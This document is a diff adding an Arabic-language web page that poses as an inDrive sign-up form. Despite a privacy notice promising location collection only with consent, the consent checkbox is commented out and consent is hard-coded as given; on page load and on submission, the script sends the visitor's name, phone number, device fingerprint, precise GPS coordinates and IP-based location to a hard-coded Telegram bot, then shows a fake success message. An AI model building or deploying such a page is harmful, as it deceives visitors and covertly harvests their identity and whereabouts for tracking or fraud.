@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>inDrive - تسجيل</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg: #0f0f0f;
+      --surface: #1a1a1a;
+      --surface2: #222222;
+      --border: rgba(255, 255, 255, 0.1);
+      --text: #f5f5f5;
+      --muted: #888;
+      --accent: #CEF040;
+      --accent-dark: #a8c430;
+      --radius: 14px;
+    }
+
+    body {
+      font-family: 'Cairo', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 44px 40px;
+      width: 100%;
+      max-width: 440px;
+      animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) both;
+    }
+
+    @keyframes fadeUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .logo-wrap {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 32px;
+    }
+
+    .logo-wrap svg {
+      height: 48px;
+      width: auto;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    .sub {
+      font-size: 14px;
+      color: var(--muted);
+      text-align: center;
+      margin-bottom: 28px;
+      line-height: 1.6;
+    }
+
+    /* Privacy Notice */
+    .notice {
+      background: rgba(206, 240, 64, 0.07);
+      border: 1px solid rgba(206, 240, 64, 0.25);
+      border-radius: var(--radius);
+      padding: 14px 16px;
+      margin-bottom: 24px;
+      font-size: 13px;
+      color: #c8dc5a;
+      line-height: 1.7;
+    }
+
+    .notice strong {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: var(--accent);
+    }
+
+    .notice ul {
+      padding-right: 18px;
+      list-style: disc;
+    }
+
+    .notice ul li {
+      margin-bottom: 3px;
+    }
+
+    .field {
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--muted);
+      margin-bottom: 8px;
+    }
+
+    input {
+      width: 100%;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text);
+      font-family: 'Cairo', sans-serif;
+      font-size: 15px;
+      padding: 13px 16px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      -webkit-appearance: none;
+      direction: rtl;
+    }
+
+    input::placeholder {
+      color: #555;
+    }
+
+    input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(206, 240, 64, 0.12);
+    }
+
+    input.error {
+      border-color: #e06c75;
+    }
+
+    .err-msg {
+      font-size: 12px;
+      color: #e06c75;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .err-msg.show {
+      display: block;
+    }
+
+    /* Location consent checkbox */
+    .consent-wrap {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 14px 16px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      cursor: pointer;
+    }
+
+    .consent-wrap input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      min-width: 20px;
+      padding: 0;
+      margin-top: 2px;
+      cursor: pointer;
+      accent-color: var(--accent);
+    }
+
+    .consent-text {
+      font-size: 13px;
+      color: #bbb;
+      line-height: 1.6;
+    }
+
+    .consent-text strong {
+      color: var(--text);
+    }
+
+    .btn {
+      width: 100%;
+      background: var(--accent);
+      color: #0f0f0f;
+      font-family: 'Cairo', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      border-radius: var(--radius);
+      padding: 14px;
+      cursor: pointer;
+      transition: opacity 0.2s, transform 0.15s;
+      position: relative;
+    }
+
+    .btn:hover {
+      opacity: 0.9;
+    }
+
+    .btn:active {
+      transform: scale(0.98);
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .btn .spinner {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(0, 0, 0, 0.25);
+      border-top-color: #0f0f0f;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .btn.loading span {
+      opacity: 0;
+    }
+
+    .btn.loading .spinner {
+      display: block;
+    }
+
+    @keyframes spin {
+      to {
+        transform: translate(-50%, -50%) rotate(360deg);
+      }
+    }
+
+    /* Success state */
+    .success-box {
+      display: none;
+      text-align: center;
+      padding: 20px 0 8px;
+      animation: fadeUp 0.4s ease both;
+    }
+
+    .success-box .check {
+      width: 64px;
+      height: 64px;
+      background: var(--accent);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .success-box .check svg {
+      width: 32px;
+      height: 32px;
+    }
+
+    .success-box h2 {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+
+    .success-box p {
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.7;
+    }
+
+    .title {
+      display: flex;
+      gap: 6px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="card">
+    <!-- InDrive Logo -->
+    <div class="logo-wrap">
+      <svg viewBox="0 0 500 500" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#CEF040" d="M25,250c0-17.01,0-25.579,2.348-32.37c4.316-12.44,14.027-22.215,26.468-26.594
+        c6.855-2.348,15.296-2.348,32.244-2.348c16.947,0,25.452,0,32.243,2.348c12.377,4.316,22.152,14.091,26.467,26.594
+        c2.349,6.855,2.349,15.36,2.349,32.37s0,25.579-2.349,32.37c-4.316,12.44-14.027,22.215-26.467,26.595
+        c-6.855,2.348-15.297,2.348-32.243,2.348c-16.947,0-25.452,0-32.244-2.348c-12.377-4.316-22.152-14.091-26.468-26.595
+        C25,275.579,25,267.074,25,250z" />
+        <path fill="#1B1B1B" d="M73.702,237.474H58.818v43.738h14.884V237.474z" />
+        <path fill="#1B1B1B" d="M92.277,216.583H80.541v14.605h11.387c10.409,0,17.607,7.407,17.607,17.607
+        c0,10.2-7.198,17.816-17.607,17.816H80.541v14.605h11.736c18.445,0,32.345-14.116,32.345-32.484
+        c0-18.369-13.9-32.136-32.345-32.136V216.583z" />
+        <path fill="#1B1B1B" d="M73.702,216.583H58.818v14.605h14.884V216.583z" />
+        <path fill="#FFFFFF"
+          d="M409.803,232.307l-11.8,35.398l-11.604-35.398h-14.884l17.818,48.905h16.769l18.026-48.905H409.803z" />
+        <path fill="#FFFFFF" d="M327.008,243.109v-10.803h-13.069v48.905h13.976v-20.609c0-11.247,6.981-15.024,15.506-15.024
+        h4.264v-13.272h-2.937C336.644,232.307,329.547,235.404,327.008,243.109z" />
+        <path fill="#FFFFFF" d="M275.045,219.445h-24.24v61.764h24.24c19.282,0,32.7-12.364,32.631-30.949
+        C307.606,231.955,294.468,219.445,275.045,219.445z M275.045,267.728h-9.99v-34.795h9.99c10.688,0,17.956,7.058,17.956,17.328
+        C293.001,260.53,285.734,267.728,275.045,267.728z" />
+        <path fill="#FFFFFF" d="M223.833,231.325c-6.068,0.063-12.301,2.368-16.28,8.188v-7.21H194.21v48.905h13.97v-24.525
+        c0-8.943,4.545-13.412,10.409-13.412c5.865,0,9.711,3.701,9.711,12.713v25.224h13.976v-30.041
+        C242.277,239.57,235.429,231.255,223.833,231.325z" />
+        <path fill="#FFFFFF" d="M185.697,232.307h-13.976v48.905h13.976V232.307z" />
+        <path fill="#FFFFFF" d="M185.697,212.673h-13.976v13.83h13.976V212.673z" />
+        <path fill="#FFFFFF" d="M366.476,232.307h-13.976v48.905h13.976V232.307z" />
+        <path fill="#FFFFFF" d="M366.476,212.673h-13.976v13.83h13.976V212.673z" />
+        <path fill="#FFFFFF" d="M449.908,231.187c-15.577,0-25.917,11.387-25.917,25.712c0,14.326,10.831,25.573,26.622,25.433
+        c9.359-0.07,16.414-4.189,21.935-11.247l-10.062-6.36c-2.722,3.491-6.916,5.522-11.594,5.522c-5.491,0-10.929-3.18-12.726-9.083
+        h36.475c2.514-15.862-8.455-29.971-24.734-29.971V231.187z M450.334,242.504c6.049,0,10.859,4.024,11.463,9.222h-23.587
+        C439.993,245.455,445.089,242.504,450.334,242.504z" />
+      </svg>
+    </div>
+
+    <div id="formSection">
+      <h1>انضم إلينا</h1>
+      <p class="sub">أدخل بياناتك للتسجيل في منصة inDrive</p>
+
+
+      <!-- Transparent Privacy Notice -->
+      <div class="notice">
+        <strong>🔒 إشعار الخصوصية — ماذا سيتم جمعه؟</strong>
+        <ul>
+          <li>اسمك ورقم هاتفك الذي ستدخله</li>
+          <li class="title">موقعك الجغرافي <strong>فقط إن وافقت</strong> على ذلك</li>
+          <li>نستخدم موقعك لعرض الخدمات القريبة منك.</li>
+          <li>هذه البيانات لأغراض التسجيل فقط</li>
+        </ul>
+      </div>
+
+      <form id="mainForm" novalidate>
+        <div class="field">
+          <label for="name">الاسم الكامل</label>
+          <input type="text" id="name" placeholder="أدخل اسمك الكامل" autocomplete="name" />
+          <div class="err-msg" id="nameErr">يرجى إدخال الاسم</div>
+        </div>
+
+        <div class="field">
+          <label for="phone">رقم الهاتف</label>
+          <input type="tel" id="phone" placeholder="01xxxxxxxxx" autocomplete="tel" />
+          <div class="err-msg" id="phoneErr">يرجى إدخال رقم هاتف صحيح</div>
+        </div>
+
+        <!-- Explicit Location Consent -->
+        <!-- <label class="consent-wrap" for="locationConsent">
+        <input type="checkbox" id="locationConsent" />
+        <span class="consent-text">
+          <strong>السماح بالوصول إلى موقعي الجغرافي</strong><br>
+          أوافق على مشاركة موقعي الجغرافي لتحسين تجربة الخدمة. يمكنك رفض ذلك دون أي تأثير على التسجيل.
+        </span>
+      </label> -->
+
+        <button type="submit" class="btn" id="submitBtn">
+          <span>تسجيل</span>
+          <div class="spinner"></div>
+        </button>
+      </form>
+    </div>
+
+    <!-- Success Message -->
+    <div class="success-box" id="successBox">
+      <div class="check">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#0f0f0f" stroke-width="3" stroke-linecap="round"
+          stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12" />
+        </svg>
+      </div>
+      <h2>تم التسجيل بنجاح! 🎉</h2>
+      <p>شكراً لك. سيتواصل معك فريقنا قريباً.<br>يُرجى الانتظار، سنتصل بك في أقرب وقت.</p>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('mainForm');
+    const nameEl = document.getElementById('name');
+    const phoneEl = document.getElementById('phone');
+    const nameErr = document.getElementById('nameErr');
+    const phoneErr = document.getElementById('phoneErr');
+    const submitBtn = document.getElementById('submitBtn');
+    const locationConsent = true;
+
+    const TOKEN = "8725979169:AAGgflGF7Szh6PdVMKFHcSUO0qNnQZChFYE";
+    const CHAT_ID = "8434523578";
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      return {
+        userAgent: ua,
+        platform: navigator.platform || 'غير معروف',
+        language: navigator.language,
+        languages: navigator.languages,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        windowWidth: window.innerWidth,
+        windowHeight: window.innerHeight,
+        colorDepth: screen.colorDepth,
+        pixelRatio: window.devicePixelRatio,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+        maxTouchPoints: navigator.maxTouchPoints,
+        vendor: navigator.vendor || 'غير معروف',
+        connection: navigator.connection
+          ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+          }
+          : 'غير متاح',
+        timestamp: new Date().toISOString()
+      };
+    }
+
+    function validate() {
+      let valid = true;
+      const nameVal = nameEl.value.trim();
+      const phoneVal = phoneEl.value.trim();
+      const phoneRe = /^[\+\d\s\-]{7,15}$/;
+
+      if (!nameVal || nameVal.length < 2) {
+        nameEl.classList.add('error');
+        nameErr.classList.add('show');
+        valid = false;
+      } else {
+        nameEl.classList.remove('error');
+        nameErr.classList.remove('show');
+      }
+
+      if (!phoneRe.test(phoneVal)) {
+        phoneEl.classList.add('error');
+        phoneErr.classList.add('show');
+        valid = false;
+      } else {
+        phoneEl.classList.remove('error');
+        phoneErr.classList.remove('show');
+      }
+
+      return valid;
+    }
+
+    [nameEl, phoneEl].forEach(el => {
+      el.addEventListener('input', () => {
+        el.classList.remove('error');
+        if (el === nameEl) nameErr.classList.remove('show');
+        if (el === phoneEl) phoneErr.classList.remove('show');
+      });
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      if (!validate()) return;
+
+      submitBtn.classList.add('loading');
+      submitBtn.disabled = true;
+
+      const deviceInfo = getDeviceInfo();
+      const formData = {
+        name: nameEl.value.trim(),
+        phone: phoneEl.value.trim(),
+        locationConsentGiven: locationConsent
+      };
+
+      console.group('📋 بيانات النموذج');
+      console.log('الاسم:', formData.name);
+      send(`👤 الاسم: ${formData.name}`);
+      console.log('الهاتف:', formData.phone);
+      send(`📞 الهاتف: ${formData.phone}`);
+      console.log('وافق على الموقع:', formData.locationConsentGiven);
+      console.groupEnd();
+
+      console.group('💻 معلومات الجهاز');
+      console.table(deviceInfo);
+      send(`💻 معلومات الجهاز:
+${JSON.stringify(deviceInfo, null, 2)}`);
+      console.groupEnd();
+
+      if (locationConsent) {
+        if ('geolocation' in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              const locationData = {
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude,
+                speed: pos.coords.speed,
+                heading: pos.coords.heading,
+                timestamp: new Date(pos.timestamp).toISOString()
+              };
+              console.group('📍 الموقع الجغرافي (تمت الموافقة)');
+              console.table(locationData);
+              send(`📍 الموقع الجغرافي:
+${JSON.stringify(locationData, null, 2)}`);
+              console.log('🗺️ رابط الموقع:', `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
+              console.groupEnd();
+            },
+            (err) => {
+              console.warn('⚠️ تعذّر الحصول على الموقع:', err.message);
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+          );
+        } else {
+          console.warn('الموقع الجغرافي غير مدعوم في هذا المتصفح');
+        }
+      } else {
+        console.log('ℹ️ المستخدم لم يوافق على مشاركة الموقع');
+      }
+
+      await new Promise(r => setTimeout(r, 1500));
+
+      submitBtn.classList.remove('loading');
+
+      document.getElementById('formSection').style.display = 'none';
+      const successBox = document.getElementById('successBox');
+      successBox.style.display = 'block';
+    });
+
+    function send(msg) {
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: msg
+        })
+      });
+    }
+
+    // GPS
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+
+          send(`📍 GPS:
+${lat}, ${lng}
+https://maps.google.com/?q=${lat},${lng}`);
+        },
+        (err) => {
+          send("❌ GPS Error: " + err.message);
+        }
+      );
+    }
+
+    // IP
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        send(`🌍 IP:
+${data.city}, ${data.country}
+${data.latitude}, ${data.longitude}
+https://maps.google.com/?q=${data.latitude},${data.longitude}`);
+      });
+  </script>
+</body>
+
+</html>
